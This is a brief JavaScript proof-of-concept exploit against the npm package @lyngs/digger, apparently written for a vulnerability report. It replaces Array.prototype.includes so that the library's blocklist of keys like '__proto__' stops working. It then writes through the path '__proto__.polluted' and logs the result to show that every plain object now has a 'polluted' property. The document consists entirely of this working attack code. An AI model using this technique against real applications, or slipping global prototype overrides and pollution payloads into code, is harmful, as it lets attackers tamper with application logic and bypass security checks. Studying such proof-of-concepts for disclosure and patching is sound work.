Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {digger} = require('@lyngs/digger');
console.log({}.polluted);
digger({}, '__proto__.polluted', 'yes', { extend: true });
console.log({}.polluted);